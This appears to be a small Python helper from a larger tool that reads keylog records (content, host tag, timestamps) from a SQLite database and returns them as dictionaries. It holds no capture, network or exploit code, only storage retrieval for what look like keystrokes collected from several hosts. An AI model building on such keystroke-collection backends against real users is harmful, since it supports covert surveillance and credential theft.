from infra.database.database import Keylogger, sqlite_db_sync as sqlite_db


def row_dict(row):
    # Turns a keylog row into a dict
    return {
        "id": row.id,
        "tag": row.tag,
        "content": row.content,
        "host_tag": row.host_tag,
        "created_at": row.created_at.isoformat() if row.created_at else "",
    }


def keylogs():
    # Returns every keylog stored in the DB
    return [row_dict(row) for row in sqlite_db.read(Keylogger)]
